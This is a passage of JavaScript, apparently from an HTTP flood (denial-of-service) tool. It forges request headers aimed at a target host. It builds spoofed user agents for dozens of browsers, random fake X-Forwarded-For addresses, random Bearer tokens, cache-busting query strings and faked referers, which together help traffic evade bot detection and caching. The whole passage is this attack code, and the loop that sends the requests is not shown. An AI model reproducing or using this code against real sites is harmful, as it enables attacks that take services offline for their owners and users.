        opera: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 OPR/${version}.0.0.0`,
        operagx: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 OPR/${version}.0.0.0`,
        edge: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 Edg/${version}.0.0.0`,
        vivaldi: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 Vivaldi/${version}.0.0.0`,
        ucbrowser: `Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Mobile Safari/537.36 UCBrowser/${version}.0.0.0`,
        samsung: `Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/${version}.0 Chrome/${version}.0.0.0 Mobile Safari/537.36`,
        duckduckgo: `Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) DuckDuckGo/${version}.0.0.0 Chrome/${version}.0.0.0 Mobile Safari/537.36`,
        puffin: `Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Mobile Safari/537.36 Puffin/${version}.0.0.0`,
        avast: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 Avast/${version}.0.0.0`,
        avg: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 AVG/${version}.0.0.0`,
        ccleaner: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 CCleaner/${version}.0.0.0`,
        epic: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 Epic/${version}.0.0.0`,
        naver: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 Whale/${version}.0.0.0`,
        yandex: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 YaBrowser/${version}.0.0.0`,
        aloha: `Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Mobile Safari/537.36 AlohaBrowser/${version}.0.0.0`,
        kiwi: `Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Mobile Safari/537.36 Kiwi/${version}.0.0.0`,
        bromite: `Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Mobile Safari/537.36 Bromite/${version}.0.0.0`,
        falkon: `Mozilla/5.0 (Linux; KDE) AppleWebKit/537.36 (KHTML, like Gecko) Falkon/${version}.0.0.0 Safari/537.36`,
        midori: `Mozilla/5.0 (Linux; rv:${version}.0) Gecko/20100101 Firefox/${version}.0 Midori/${version}.0.0.0`,
        palemoon: `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${version}.0) Gecko/20100101 Goanna/6.0 Firefox/${version}.0 PaleMoon/${version}.0.0.0`,
        waterfox: `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${version}.0) Gecko/20100101 Firefox/${version}.0 Waterfox/${version}.0.0.0`,
        librewolf: `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${version}.0) Gecko/20100101 Firefox/${version}.0 LibreWolf/${version}.0.0.0`,
        tor: `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${version}.0) Gecko/20100101 Firefox/${version}.0 TorBrowser/${version}.0.0.0`,
        bravenightly: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 Brave/${version}.0.0.0 Nightly`,
        "chrome-canary": `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 Canary`,
        "firefox-nightly": `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${version}.0) Gecko/20100101 Firefox/${version}.0 Nightly`,
        "opera-crypto": `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 OPR/${version}.0.0.0 Crypto`,
        "vivaldi-snapshot": `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 Vivaldi/${version}.0.0.0 Snapshot`
    };
    const secFetchUser = Math.random() < 0.75 ? "?1;?1" : "?1";
const secChUaMobile = browser === "mobile" || browser === "ucbrowser" || browser === "samsung" || browser === "duckduckgo" || browser === "puffin" || browser === "aloha" || browser === "kiwi" || browser === "bromite" ? "?1" : "?0";
const acceptEncoding = Math.random() < 0.5 ? "gzip, deflate, br, zstd" : "gzip, deflate, br";
const accept = Math.random() < 0.5 
  ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" 
  : "application/json";
  
const secChUaPlatform = Math.random() < 0.5 ? '"Windows"' : '"Linux"';
const secChUaFull = Math.random() < 0.5 ? '"Google Chrome";v="134", "Chromium";v="134"' : '"Mozilla Firefox";v="136"';
const secFetchDest = Math.random() < 0.5 ? "document" : "image";
const secFetchMode = Math.random() < 0.5 ? "navigate" : "cors";
const secFetchSite = Math.random() < 0.5 ? "same-origin" : "cross-site";

const acceptLanguage = Math.random() < 0.5 
  ? "en-US,en;q=0.9" 
  : Math.random() < 0.5 
  ? "en-GB,en;q=0.9" 
  : "es-ES,es;q=0.8,en;q=0.7";

const acceptCharset = Math.random() < 0.5 ? "UTF-8" : "ISO-8859-1";

const connection = Math.random() < 0.5 ? "keep-alive" : "close";

const xRequestedWith = Math.random() < 0.5 ? "XMLHttpRequest" : "Fetch";

const referer = Math.random() < 0.5 
  ? "https://www.google.com" 
  : "https://www.bing.com";
  
const xForwardedFor = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;

const te = Math.random() < 0.5 ? "trailers" : "gzip";

const cacheControl = Math.random() < 0.5 ? "no-cache" : "max-age=3600";
    const headersMap = {
  chrome: {
    ":method": "GET",
    ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
    ":scheme": "https",
    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10) + "&_=" + Date.now(),
    "sec-ch-ua": `"Chromium";v="${Math.floor(125 + Math.random() * 10)}", "Google Chrome";v="${Math.floor(125 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
    "sec-ch-ua-mobile": `${Math.random() < 0.5 ? "?1" : "?0"}`,
    "accept": Math.random() < 0.5 ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" : "application/json",
    "pragma": "no-cache",
    "user-agent": userAgent.chrome,
    "sec-fetch-user": Math.random() < 0.5 ? "?1;?1" : "?0",
    "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br, zstd" : "gzip, deflate, br",
    "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "ru-RU,ru;q=0.8",
    "sec-ch-ua-platform": Math.random() < 0.5 ? '"Windows"' : '"Linux"',
    "sec-ch-ua-platform-version": Math.random() < 0.5 ? "10.0.0" : "15.2.0",
    "sec-fetch-dest": Math.random() < 0.5 ? "document" : "image",
    "sec-fetch-mode": Math.random() < 0.5 ? "navigate" : "cors",
    "sec-fetch-site": Math.random() < 0.5 ? "same-origin" : "cross-site",
    "referer": Math.random() < 0.5 ? "https://www.google.com" : "https://www.youtube.com",
    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "cache-control": Math.random() < 0.5 ? "no-cache" : "max-age=0",
    "dnt": Math.random() < 0.5 ? "1" : "0",
    "connection": Math.random() < 0.5 ? "keep-alive" : "close",
    "x-requested-with": Math.random() < 0.5 ? "XMLHttpRequest" : "com.android.browser",
    "authorization": `Bearer ${generateRandomString(16, 32)}`,
    "content-type": Math.random() < 0.5 ? "application/json" : "text/html;charset=UTF-8",
    "origin": Math.random() < 0.5 ? "https://www.google.com" : "https://www.facebook.com",
    "referrer-policy": Math.random() < 0.5 ? "strict-origin-when-cross-origin" : "no-referrer",
    "etag": `W/"${generateRandomString(13, 20)}"`,
    "if-none-match": Math.random() < 0.5 ? `W/"${generateRandomString(13, 20)}"` : null,
    "Sec-CH-UA-Full-Version-List": `"Google Chrome";v="${Math.floor(125 + Math.random() * 10)}", "Chromium";v="${Math.floor(125 + Math.random() * 10)}"`,
    // HUMAN HEADERS DARI HumanBehavior
    ...human.getHumanHeaders()
  },
  firefox: {
    ":method": "GET",
    ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
    ":scheme": "https",
    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10) + "&_=" + Date.now(),
    "sec-ch-ua": `"Firefox";v="${Math.floor(125 + Math.random() * 11)}", "Gecko";v="20100101", "Mozilla";v="5.0"`,
    "sec-ch-ua-mobile": "?0",
    "accept": `${Math.random() < 0.5 ? "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" : "application/json"}`,
    "user-agent": userAgent.firefox,
    "accept-language": "en-US,en;q=0.9",
    "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br" : "gzip, deflate",
    "referer": Math.random() < 0.5 ? "https://www.mozilla.org/" : "https://www.google.com",
    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "cache-control": "max-age=0",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    ...human.getHumanHeaders()
  },
  brave: {
    ":method": "GET",
    ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
    ":scheme": "https",
    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10) + "&_=" + Date.now(),
    "sec-ch-ua": `"Chromium";v="${Math.floor(125 + Math.random() * 10)}", "Brave";v="${Math.floor(125 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
    "sec-ch-ua-mobile": `${Math.random() < 0.5 ? "?1" : "?0"}`,
    "accept": Math.random() < 0.5 ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" : "application/json",
    "pragma": "no-cache",
    "user-agent": userAgent.brave,
    "sec-fetch-user": Math.random() < 0.5 ? "?1;?1" : "?0",
    "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br, zstd" : "gzip, deflate, br",
    "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "ru-RU,ru;q=0.8",
    "sec-ch-ua-platform": Math.random() < 0.5 ? '"Windows"' : '"Linux"',
    "sec-ch-ua-platform-version": Math.random() < 0.5 ? "10.0.0" : "15.2.0",
    "sec-fetch-dest": Math.random() < 0.5 ? "document" : "image",
    "sec-fetch-mode": Math.random() < 0.5 ? "navigate" : "cors",
    "sec-fetch-site": Math.random() < 0.5 ? "same-origin" : "cross-site",
    "referer": Math.random() < 0.5 ? "https://www.google.com" : "https://www.youtube.com",
    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "cache-control": Math.random() < 0.5 ? "no-cache" : "max-age=0",
    "dnt": "1",
    "connection": Math.random() < 0.5 ? "keep-alive" : "close",
    "x-requested-with": Math.random() < 0.5 ? "XMLHttpRequest" : "com.android.browser",
    "authorization": `Bearer ${generateRandomString(16, 32)}`,
    "content-type": Math.random() < 0.5 ? "application/json" : "text/html;charset=UTF-8",
    "origin": Math.random() < 0.5 ? "https://www.google.com" : "https://www.facebook.com",
    ...human.getHumanHeaders()
  },
  safari: {
    ":method": "GET",
    ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
    ":scheme": "https",
    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10) + "&_=" + Date.now(),
    "sec-ch-ua": `"Safari";v="${Math.floor(17 + Math.random() * 2)}", "AppleWebKit";v="605.1.15", "Not-A.Brand";v="99"`,
    "sec-ch-ua-mobile": "?0",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "user-agent": userAgent.safari,
    "accept-language": "en-US,en;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "referer": Math.random() < 0.5 ? "https://www.apple.com/" : "https://www.google.com",
    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "cache-control": Math.random() < 0.5 ? "no-cache" : "max-age=0",
    ...human.getHumanHeaders()
  },
  opera: {
    ":method": "GET",
    ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
    ":scheme": "https",
    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10) + "&_=" + Date.now(),
    "sec-ch-ua": `"Opera";v="${Math.floor(110 + Math.random() * 8)}", "Chromium";v="${Math.floor(125 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
    "sec-ch-ua-mobile": "?0",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "user-agent": userAgent.opera,
    "accept-language": "en-US,en;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "referer": Math.random() < 0.5 ? "https://www.opera.com/" : "https://www.google.com",
    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    ...human.getHumanHeaders()
  },
  operagx: {
    ":method": "GET",
    ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
    ":scheme": "https",
    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10) + "&_=" + Date.now(),
    "sec-ch-ua": `"Opera GX";v="${Math.floor(110 + Math.random() * 8)}", "Chromium";v="${Math.floor(125 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
    "sec-ch-ua-mobile": "?0",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "user-agent": userAgent.operagx,
    "accept-language": "en-US,en;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "referer": Math.random() < 0.5 ? "https://www.opera.com/gx" : "https://www.google.com",
    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    ...human.getHumanHeaders()
  },
  edge: {
    ":method": "GET",
    ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
    ":scheme": "https",
    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10) + "&_=" + Date.now(),
    "sec-ch-ua": `"Microsoft Edge";v="${Math.floor(125 + Math.random() * 10)}", "Chromium";v="${Math.floor(125 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
    "sec-ch-ua-mobile": "?0",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "user-agent": userAgent.edge,
    "accept-language": "en-US,en;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "referer": Math.random() < 0.5 ? "https://www.microsoft.com/" : "https://www.google.com",
    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    ...human.getHumanHeaders()
  },
  vivaldi: {
    ":method": "GET",
    ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
    ":scheme": "https",
    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10) + "&_=" + Date.now(),
    "sec-ch-ua": `"Vivaldi";v="${Math.floor(6 + Math.random() * 2)}", "Chromium";v="${Math.floor(125 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
    "sec-ch-ua-mobile": "?0",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "user-agent": userAgent.vivaldi,
    "accept-language": "en-US,en;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "referer": Math.random() < 0.5 ? "https://vivaldi.com/" : "https://www.google.com",
    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    ...human.getHumanHeaders()
  },
  ucbrowser: {
    ":method": "GET",
    ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
    ":scheme": "https",
    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10) + "&_=" + Date.now(),
    "sec-ch-ua": `"UCBrowser";v="${Math.floor(13 + Math.random())}", "Chromium";v="${Math.floor(125 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
    "sec-ch-ua-mobile": "?1",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "user-agent": userAgent.ucbrowser,
    "accept-language": "en-US,en;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    ...human.getHumanHeaders()
  },
  samsung: {
    ":method": "GET",
    ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
    ":scheme": "https",
    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10) + "&_=" + Date.now(),
    "sec-ch-ua": `"Samsung Internet";v="${Math.floor(23 + Math.random() * 2)}", "Chromium";v="${Math.floor(125 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
    "sec-ch-ua-mobile": "?1",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "user-agent": userAgent.samsung,
    "accept-language": "en-US,en;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    ...human.getHumanHeaders()
  },
  duckduckgo: {
    ":method": "GET",
    ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
    ":scheme": "https",
    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10) + "&_=" + Date.now(),
    "sec-ch-ua": `"DuckDuckGo";v="${Math.floor(7 + Math.random())}", "Chromium";v="${Math.floor(125 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
    "sec-ch-ua-mobile": "?1",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "user-agent": userAgent.duckduckgo,
    "accept-language": "en-US,en;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    ...human.getHumanHeaders()
  },
  puffin: {
    ":method": "GET",
    ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
    ":scheme": "https",
    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10) + "&_=" + Date.now(),
    "sec-ch-ua": `"Puffin";v="${Math.floor(9 + Math.random())}", "Chromium";v="${Math.floor(125 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
    "sec-ch-ua-mobile": "?1",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "user-agent": userAgent.puffin,
    "accept-language": "en-US,en;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    ...human.getHumanHeaders()
  },
  avast: {
    ":method": "GET",
    ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
    ":scheme": "https",
    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10) + "&_=" + Date.now(),
    "sec-ch-ua": `"Avast";v="${Math.floor(119 + Math.random() * 5)}", "Chromium";v="${Math.floor(125 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
    "sec-ch-ua-mobile": "?0",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "user-agent": userAgent.avast,
    "accept-language": "en-US,en;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "referer": Math.random() < 0.5 ? "https://www.avast.com/" : "https://www.google.com",
    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    ...human.getHumanHeaders()
  },
  avg: {
    ":method": "GET",
    ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
    ":scheme": "https",
    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10) + "&_=" + Date.now(),
    "sec-ch-ua": `"AVG";v="${Math.floor(119 + Math.random() * 5)}", "Chromium";v="${Math.floor(125 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
    "sec-ch-ua-mobile": "?0",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "user-agent": userAgent.avg,
    "accept-language": "en-US,en;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "referer": Math.random() < 0.5 ? "https://www.avg.com/" : "https://www.google.com",
    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    ...human.getHumanHeaders()
  },
  ccleaner: {
    ":method": "GET",
    ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
    ":scheme": "https",
    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10) + "&_=" + Date.now(),
    "sec-ch-ua": `"CCleaner";v="${Math.floor(119 + Math.random() * 5)}", "Chromium";v="${Math.floor(125 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
    "sec-ch-ua-mobile": "?0",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "user-agent": userAgent.ccleaner,
    "accept-language": "en-US,en;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "referer": Math.random() < 0.5 ? "https://www.ccleaner.com/" : "https://www.google.com",
    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    ...human.getHumanHeaders()
  },
  epic: {
    ":method": "GET",
    ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
    ":scheme": "https",
    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10) + "&_=" + Date.now(),
    "sec-ch-ua": `"Epic";v="${Math.floor(119 + Math.random() * 5)}", "Chromium";v="${Math.floor(125 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
    "sec-ch-ua-mobile": "?0",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "user-agent": userAgent.epic,
    "accept-language": "en-US,en;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "referer": Math.random() < 0.5 ? "https://www.epicbrowser.com/" : "https://www.google.com",
    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    ...human.getHumanHeaders()
  },
  naver: {
    ":method": "GET",
    ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
    ":scheme": "https",
    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10) + "&_=" + Date.now(),
    "sec-ch-ua": `"Whale";v="${Math.floor(4 + Math.random())}", "Chromium";v="${Math.floor(125 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
    "sec-ch-ua-mobile": "?0",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "user-agent": userAgent.naver,
    "accept-language": "ko-KR,ko;q=0.9,en;q=0.8",
    "accept-encoding": "gzip, deflate, br",
    "referer": Math.random() < 0.5 ? "https://www.naver.com/" : "https://www.google.com",
    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    ...human.getHumanHeaders()
  },
  yandex: {
    ":method": "GET",
    ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
    ":scheme": "https",
    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10) + "&_=" + Date.now(),
    "sec-ch-ua": `"Yandex";v="${Math.floor(23 + Math.random())}", "Chromium";v="${Math.floor(125 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
    "sec-ch-ua-mobile": "?0",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
